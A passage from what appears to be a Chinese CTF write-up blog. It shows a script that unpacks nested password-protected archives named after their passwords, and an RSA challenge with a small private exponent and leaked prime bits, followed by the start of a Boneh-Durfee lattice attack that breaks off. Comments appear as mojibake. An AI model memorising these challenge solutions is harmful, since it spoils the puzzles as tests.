class="line">Â  Â  file = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  zfilefile = path+file</span><br><span class="line"></span><br><span class="line">Â  Â  s = file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  pwds= s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(file)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">with</span> py7zr.SevenZipFile(zfilefile, mode=<span class="string">&#x27;r&#x27;</span>, password=pwds) <span class="keyword">as</span> z:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.extractall(path=<span class="string">&#x27;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">with</span> zipfile.ZipFile(zfilefile,mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.extractall(<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span>,pwd=pwds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># zpf= zipfile.ZipFile(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># list = zpf.namelist() Â # å¾—åˆ°å‹ç¼©åŒ…é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># for f in list:</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  zpf.extract(f, &quot;zip&quot;, pwd=pwds.encode(&#x27;utf-8&#x27;)) Â # å¾ªç¯è§£å‹æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•ï¼Œå¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;è§£å‹æˆåŠŸ&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] Â == <span class="string">&quot;rar&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="function"><span class="keyword">def</span> <span class="title">unrar_file_with_password</span>(<span class="params">file_path, output_path, password</span>):</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># åˆ›å»ºRARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar = rarfile.RarFile(file_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è®¾ç½®å¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.setpassword(password)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è§£å‹RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.extractall(output_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># å…³é—­RARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  path1 = <span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># è°ƒç”¨å‡½æ•°è§£å‹å¸¦å¯†ç çš„RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  unrar_file_with_password(zfilefile, path1, pwds)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;a&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] != <span class="string">&quot;rar&quot;</span> Â <span class="keyword">and</span> s[<span class="number">1</span>] != <span class="string">&quot;zip&quot;</span> <span class="keyword">and</span> Â s[<span class="number">1</span>] != <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf = rarfile.RarFile(zfilefile) Â # å¾…è§£å‹æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># path2 =&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># print(rf)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.extractall(path = path2, pwd=&quot;39193&quot;) Â # è§£å‹æŒ‡å®šæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.close()</span></span><br></pre></td></tr></table></figure><p>linux:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = py7zr.SevenZipFile(r&#x27;e:\test.7z&#x27;,&#x27;r&#x27;)</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># now = &quot;/var/www/html/check/10621.7z&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  path=<span class="string">&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  file = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  zfilefile = path+file</span><br><span class="line"></span><br><span class="line">Â  Â  s = file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  pwds= s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(file)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">with</span> py7zr.SevenZipFile(zfilefile, mode=<span class="string">&#x27;r&#x27;</span>, password=pwds) <span class="keyword">as</span> z:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.extractall(path=<span class="string">&#x27;/var/www/html/check/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">with</span> zipfile.ZipFile(zfilefile,mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.extractall(<span class="string">&quot;/var/www/html/check/&quot;</span>,pwd=pwds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># zpf= zipfile.ZipFile(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># list = zpf.namelist() Â # å¾—åˆ°å‹ç¼©åŒ…é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># for f in list:</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  zpf.extract(f, &quot;zip&quot;, pwd=pwds.encode(&#x27;utf-8&#x27;)) Â # å¾ªç¯è§£å‹æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•ï¼Œå¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;è§£å‹æˆåŠŸ&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] Â == <span class="string">&quot;rar&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="function"><span class="keyword">def</span> <span class="title">unrar_file_with_password</span>(<span class="params">file_path, output_path, password</span>):</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># åˆ›å»ºRARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar = rarfile.RarFile(file_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è®¾ç½®å¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.setpassword(password)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è§£å‹RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.extractall(output_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># å…³é—­RARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  path1 = <span class="string">&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># è°ƒç”¨å‡½æ•°è§£å‹å¸¦å¯†ç çš„RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  unrar_file_with_password(zfilefile, path1, pwds)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;a&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] != <span class="string">&quot;rar&quot;</span> Â <span class="keyword">and</span> s[<span class="number">1</span>] != <span class="string">&quot;zip&quot;</span> <span class="keyword">and</span> Â s[<span class="number">1</span>] != <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf = rarfile.RarFile(zfilefile) Â # å¾…è§£å‹æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># path2 =&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># print(rf)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.extractall(path = path2, pwd=&quot;39193&quot;) Â # è§£å‹æŒ‡å®šæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.close()</span></span><br></pre></td></tr></table></figure><h5 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/mumuhhh/p/17789591.html</span><br><span class="line">https://blog.csdn.net/Ahi0upsec/article/details/132717024</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">299</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint1 = <span class="subst">&#123;hint1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint2 = <span class="subst">&#123;hint2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># n = 64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line"><span class="comment"># e = 31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line"><span class="comment"># c = 44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line"><span class="comment"># hint1 = 597218086872775768003</span></span><br><span class="line"><span class="comment"># hint2 = 836339982627318976124</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># å¦‚æœæ™¶æ ¼è¾¾åˆ°è¯¥å°ºå¯¸ï¼Œåˆ™åœæ­¢ç§»é™¤</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºæœ‰ç”¨çŸ¢é‡çš„ç»Ÿè®¡æ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span 